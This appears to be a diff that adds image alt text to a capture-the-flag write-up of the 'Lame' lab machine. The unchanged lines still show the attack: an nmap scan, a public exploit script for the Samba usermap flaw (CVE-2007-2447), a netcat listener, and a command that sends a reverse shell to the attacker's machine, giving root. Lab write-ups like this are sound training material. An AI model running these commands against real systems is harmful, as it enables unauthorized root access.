@@ -35,21 +35,21 @@ nmap TARGET -oN lame.nmap -sV -sC
 | 139      | smb         |
 | 445      | smb         |
 
-![](https://cdn.ziomsec.com/lame/1.webp)
-![](https://cdn.ziomsec.com/lame/2.webp)
+![performing an nmap scan on lame machine](https://cdn.ziomsec.com/lame/1.webp)
+![performing an nmap scan on lame machine](https://cdn.ziomsec.com/lame/2.webp)
 
 ## Initial Foothold
 
 I searched for exploits related to the FTP version found using **nmap** but did not find anything useful. I then switched to looking for exploits related to the **SMB** version and found a command execution CVE.
 
-![](https://cdn.ziomsec.com/lame/3.webp)
+![searching for smb exploits](https://cdn.ziomsec.com/lame/3.webp)
 
 Hence, I looked for ways to exploit the CVE and found a tool on GitHub: 
 - https://github.com/amriunix/CVE-2007-2447
 
 I downloaded the script and ran it against the target to get a reverse shell:
 
-![](https://cdn.ziomsec.com/lame/4.webp)
+![checking exploit usage instructions](https://cdn.ziomsec.com/lame/4.webp)
 
 ```bash
 rlwrap nc -lnvp 8080
@@ -59,9 +59,9 @@ rlwrap nc -lnvp 8080
 python usermap_script.py TARGET 139 KALI 8080
 ```
 
-![](https://cdn.ziomsec.com/lame/5.webp)
+![running the smb exploit](https://cdn.ziomsec.com/lame/5.webp)
 
-![](https://cdn.ziomsec.com/lame/6.webp)
+![reverse shell on our listener](https://cdn.ziomsec.com/lame/6.webp)
 
 I directly got **root** access ! I then spawned a **TTY** shell for better usability.
 
@@ -69,15 +69,15 @@ I directly got **root** access ! I then spawned a **TTY** shell for better usabi
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](https://cdn.ziomsec.com/lame/7.webp)
+![spawning a pty shell](https://cdn.ziomsec.com/lame/7.webp)
 
 Finally, I looked into the directories in */home* and found the user flag in */home/makis*.
 
-![](https://cdn.ziomsec.com/lame/8.webp)
+![capturing the user flag](https://cdn.ziomsec.com/lame/8.webp)
 
 Since I was a root user, I also captured the root flag from */root*
 
-![](https://cdn.ziomsec.com/lame/9.webp)
+![capturing the root flag](https://cdn.ziomsec.com/lame/9.webp)
 
 ## Closure
 
